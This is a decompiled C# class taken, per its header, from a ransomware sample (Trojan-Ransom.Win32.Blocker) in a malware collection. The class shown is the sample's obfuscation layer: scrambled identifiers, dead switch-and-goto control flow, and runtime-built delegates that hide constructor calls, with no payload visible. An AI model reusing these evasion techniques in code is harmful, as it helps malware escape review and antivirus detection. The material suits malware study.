// Decompiled with JetBrains decompiler
// Type: A.c95e0ad90497d2f3c448c1f3b9bc788ff
// Assembly: qfpxK, Version=2.5.4.7, Culture=neutral, PublicKeyToken=null
// MVID: 361ECBAB-70B9-4DF3-85CB-6EE9889776D8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.cavk-847dea3068a77ef664bb3e6a572fbc090428c048080fb7d8d1c6a0541b13ec59.exe

using System;
using System.Reflection;
using System.Reflection.Emit;

namespace A
{
  internal class c95e0ad90497d2f3c448c1f3b9bc788ff
  {
    private static readonly int ca441cdf3d5b4a36e69c33c3cf845ec0b;
    private static readonly int c9b5b5fec27b377a58411f9ed56b2b5d5;
    private static readonly int c6727710e021b873fff9b280f18fb8dc4;
    private static readonly int cdf0fcb10df727debd4bc0ee022868534;
    private static readonly int cb79adead62142238fcc165c53fe84088;
    private static readonly int c2b02e83fb2e28388dc22c4dd57311414;
    private static readonly int c0d2c322ea079fdc3c776d872e2bd6164;
    private static readonly int c5cac3493c9f5e0821a12c44c4da9e953;
    private static readonly int c417a08eacb8772e0719ff69f6666a6ce;
    private static readonly int cc9237c0a3ef8af42e2c758f8e093baec;
    private static readonly int c74346adf872f5ccbf5687ceabab31df2;
    private static readonly int cfcb883566827787a82012b03aed11e1d;
    private static readonly int cf5281827a2883dafed1981682817c267;
    private static readonly int cea8cd0dd477a27997a216abb4da71eab;
    private static readonly ModuleHandle c59492339d16cf65678469a44c7a81966;

    static c95e0ad90497d2f3c448c1f3b9bc788ff()
    {
      if ((object) typeof (MulticastDelegate) == null)
        return;
label_1:
      switch (2)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (c95e0ad90497d2f3c448c1f3b9bc788ff.\u002Ecctor);
          }
          c95e0ad90497d2f3c448c1f3b9bc788ff.c59492339d16cf65678469a44c7a81966 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
          break;
      }
    }

    public static void ce84bec81c32dcd2e38695a350558bde1(
      int cf482c59f73393f0e875e2b06378f9431,
      int c1ae9860d2712f5fe29e775e314fbd526,
      int cefac8362c0ca9033ba345f96e412b830)
    {
      Type typeFromHandle;
      ConstructorInfo con;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(c95e0ad90497d2f3c448c1f3b9bc788ff.c59492339d16cf65678469a44c7a81966.ResolveTypeHandle(cf482c59f73393f0e875e2b06378f9431));
        con = cefac8362c0ca9033ba345f96e412b830 != 16777215 ? (ConstructorInfo) (object) MethodBase.GetMethodFromHandle(c95e0ad90497d2f3c448c1f3b9bc788ff.c59492339d16cf65678469a44c7a81966.ResolveMethodHandle(c1ae9860d2712f5fe29e775e314fbd526), c95e0ad90497d2f3c448c1f3b9bc788ff.c59492339d16cf65678469a44c7a81966.ResolveTypeHandle(cefac8362c0ca9033ba345f96e412b830)) : (ConstructorInfo) (object) MethodBase.GetMethodFromHandle(c95e0ad90497d2f3c448c1f3b9bc788ff.c59492339d16cf65678469a44c7a81966.ResolveMethodHandle(c1ae9860d2712f5fe29e775e314fbd526));
      }
      catch (Exception ex)
      {
        throw;
      }
      foreach (FieldInfo field in typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField))
      {
        try
        {
          ParameterInfo[] parameters = con.GetParameters();
          int length = parameters.Length;
          Type[] parameterTypes = new Type[length];
          for (int index = 0; index < length; ++index)
            parameterTypes[index] = parameters[index].ParameterType;
label_7:
          switch (6)
          {
            case 0:
              goto label_7;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (c95e0ad90497d2f3c448c1f3b9bc788ff.ce84bec81c32dcd2e38695a350558bde1);
              }
              DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, con.DeclaringType, parameterTypes, typeFromHandle, true);
              ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
              if (length > 0)
                ilGenerator.Emit(OpCodes.Ldarg_0);
              if (length > 1)
              {
label_13:
                switch (7)
                {
                  case 0:
                    goto label_13;
                  default:
                    ilGenerator.Emit(OpCodes.Ldarg_1);
                    break;
                }
              }
              if (length > 2)
                ilGenerator.Emit(OpCodes.Ldarg_2);
              if (length > 3)
              {
label_18:
                switch (5)
                {
                  case 0:
                    goto label_18;
                  default:
                    ilGenerator.Emit(OpCodes.Ldarg_3);
                    break;
                }
              }
              if (length > 4)
              {
label_21:
                switch (4)
                {
                  case 0:
                    goto label_21;
                  default:
                    for (int index = 4; index < length; ++index)
                      ilGenerator.Emit(OpCodes.Ldarg_S, index);
label_25:
                    switch (5)
                    {
                      case 0:
                        goto label_25;
                    }
                    break;
                }
              }
              ilGenerator.Emit(OpCodes.Newobj, con);
              ilGenerator.Emit(OpCodes.Ret);
              Delegate @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
              field.SetValue((object) null, (object) @delegate);
              continue;
          }
        }
        catch (Exception ex)
        {
        }
      }
label_30:
      switch (6)
      {
        case 0:
          goto label_30;
      }
    }
  }
}
